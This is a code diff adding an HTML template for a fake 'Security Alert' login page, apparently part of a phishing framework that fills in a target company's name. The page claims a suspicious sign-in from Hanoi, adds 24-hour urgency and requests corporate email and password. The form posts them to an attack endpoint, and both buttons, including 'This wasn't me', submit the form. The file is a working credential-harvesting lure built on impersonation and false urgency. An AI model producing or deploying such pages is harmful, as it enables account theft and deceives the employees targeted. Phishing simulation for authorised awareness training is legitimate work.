@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Security Verification | {{ attack.target.company }} IT</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body style="margin:0; padding:2rem 1rem; box-sizing:border-box; font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background:linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; color:#0f172a;">
+
+  <main style="background:#ffffff; width:100%; max-width:460px; border-radius:14px; box-shadow:0 20px 50px rgba(0, 0, 0, 0.35); overflow:hidden;">
+
+    <header style="background:linear-gradient(135deg, #b91c1c 0%, #dc2626 60%, #ef4444 100%); color:#ffffff; padding:1.6rem 1.75rem; display:flex; align-items:center; gap:0.85rem;">
+      <div style="width:48px; height:48px; border-radius:12px; background:rgba(255,255,255,0.18); display:inline-flex; align-items:center; justify-content:center; font-size:1.5rem; font-weight:700; color:#ffffff; border:1px solid rgba(255,255,255,0.35);">&#9888;</div>
+      <div>
+        <div style="font-size:1rem; font-weight:600; line-height:1.2;">Security Alert</div>
+        <div style="font-size:0.75rem; color:#fee2e2; margin-top:2px;">{{ attack.target.company }} IT Security Center</div>
+      </div>
+    </header>
+
+    <div style="background:#fef2f2; border-left:4px solid #dc2626; color:#7f1d1d; padding:0.85rem 1.5rem; font-size:0.85rem; line-height:1.55;">
+      <strong>We noticed a sign-in from a new device.</strong>
+      Please review this activity to keep your account secure.
+    </div>
+
+    <section style="padding:1.5rem 1.75rem 1.25rem;">
+
+      <div style="background:#f1f5f9; border-radius:10px; padding:0.85rem 1rem; margin-bottom:1.25rem; font-size:0.8rem; color:#334155; line-height:1.6;">
+        <div style="display:flex; justify-content:space-between; padding:0.15rem 0;">
+          <span style="color:#64748b;">When</span>
+          <span style="font-weight:600;">A few minutes ago</span>
+        </div>
+        <div style="display:flex; justify-content:space-between; padding:0.15rem 0;">
+          <span style="color:#64748b;">Where</span>
+          <span style="font-weight:600; color:#b91c1c;">Hanoi, Vietnam</span>
+        </div>
+        <div style="display:flex; justify-content:space-between; padding:0.15rem 0;">
+          <span style="color:#64748b;">Device</span>
+          <span style="font-weight:600;">Windows 11 &middot; Chrome 138</span>
+        </div>
+        <div style="display:flex; justify-content:space-between; padding:0.15rem 0;">
+          <span style="color:#64748b;">Account</span>
+          <span style="font-weight:600;">{{ attack.target.name }}@{{ attack.target.company|lower }}.com</span>
+        </div>
+      </div>
+
+      <h1 style="margin:0 0 0.4rem 0; font-size:1.3rem; font-weight:600; color:#0f172a;">Was this you?</h1>
+      <p style="margin:0 0 1.4rem 0; color:#64748b; font-size:0.88rem; line-height:1.55;">
+        Sign in with your corporate credentials to confirm this activity.
+        For your protection, this request will expire in
+        <strong style="color:#b91c1c;">24 hours</strong>.
+      </p>
+
+      <form
+        id="securityVerifyForm"
+        method="post"
+        action="{{ attack.scheme.components.first(name='security_verify_api').url }}"
+        style="margin:0;"
+        autocomplete="on"
+      >
+
+        <div style="margin-bottom:1rem;">
+          <label for="username" style="display:block; font-size:0.82rem; font-weight:600; color:#334155; margin-bottom:0.35rem;">
+            Corporate Email / Username <span style="color:#dc2626;">*</span>
+          </label>
+          <input
+            id="username"
+            type="text"
+            name="username"
+            placeholder="you@{{ attack.target.company|lower }}.com"
+            autocomplete="username"
+            required
+            style="width:100%; padding:0.7rem 0.9rem; border:1px solid #cbd5e1; border-radius:8px; font-size:0.95rem; font-family:inherit; color:#0f172a; background:#f8fafc; box-sizing:border-box; outline:none;"
+            onfocus="this.style.borderColor='#dc2626'; this.style.background='#ffffff'; this.style.boxShadow='0 0 0 3px rgba(220, 38, 38, 0.15)';"
+            onblur="this.style.borderColor='#cbd5e1'; this.style.background='#f8fafc'; this.style.boxShadow='none';"
+          >
+        </div>
+
+        <div style="margin-bottom:1.25rem;">
+          <label for="password" style="display:block; font-size:0.82rem; font-weight:600; color:#334155; margin-bottom:0.35rem;">
+            Password <span style="color:#dc2626;">*</span>
+          </label>
+          <input
+            id="password"
+            type="password"
+            name="password"
+            placeholder="Enter your password"
+            autocomplete="current-password"
+            required
+            style="width:100%; padding:0.7rem 0.9rem; border:1px solid #cbd5e1; border-radius:8px; font-size:0.95rem; font-family:inherit; color:#0f172a; background:#f8fafc; box-sizing:border-box; outline:none;"
+            onfocus="this.style.borderColor='#dc2626'; this.style.background='#ffffff'; this.style.boxShadow='0 0 0 3px rgba(220, 38, 38, 0.15)';"
+            onblur="this.style.borderColor='#cbd5e1'; this.style.background='#f8fafc'; this.style.boxShadow='none';"
+          >
+        </div>
+
+        <button
+          type="submit"
+          style="width:100%; padding:0.85rem; background:linear-gradient(135deg, #dc2626, #b91c1c); color:#ffffff; border:none; border-radius:8px; font-size:0.98rem; font-weight:600; font-family:inherit; cursor:pointer; letter-spacing:0.3px; box-shadow:0 4px 10px rgba(220, 38, 38, 0.3); transition:transform 0.1s;"
+          onmouseover="this.style.boxShadow='0 8px 20px rgba(220, 38, 38, 0.45)'; this.style.transform='translateY(-1px)';"
+          onmouseout="this.style.boxShadow='0 4px 10px rgba(220, 38, 38, 0.3)'; this.style.transform='translateY(0)';"
+        >
+          &#128274; Yes, this was me
+        </button>
+
+        <button
+          type="submit"
+          formnovalidate
+          style="width:100%; padding:0.7rem; margin-top:0.6rem; background:#ffffff; color:#334155; border:1px solid #cbd5e1; border-radius:8px; font-size:0.9rem; font-weight:500; font-family:inherit; cursor:pointer;"
+          onmouseover="this.style.borderColor='#94a3b8'; this.style.color='#0f172a';"
+          onmouseout="this.style.borderColor='#cbd5e1'; this.style.color='#334155';"
+        >
+          This wasn&apos;t me &middot; Secure my account
+        </button>
+      </form>
+    </section>
+
+    <footer style="background:#f8fafc; padding:0.9rem 1.75rem; border-top:1px solid #e2e8f0; text-align:center; font-size:0.75rem; color:#64748b; line-height:1.55;">
+      <span style="color:#16a34a; font-weight:600;">&#128274; Secure connection</span>
+      &middot; &copy; {{ attack.target.company if attack and attack.target else 'Corporate' }} IT Security<br>
+      Need help? Contact
+      <a
+        href="mailto:it-security@{{ attack.target.company|lower }}.com"
+        style="color:#dc2626; text-decoration:none;"
+      >it-security@{{ attack.target.company|lower }}.com</a>
+    </footer>
+
+  </main>
+  <script src="/security_alert_login/security_verify.js"></script>
+</body>
+</html>
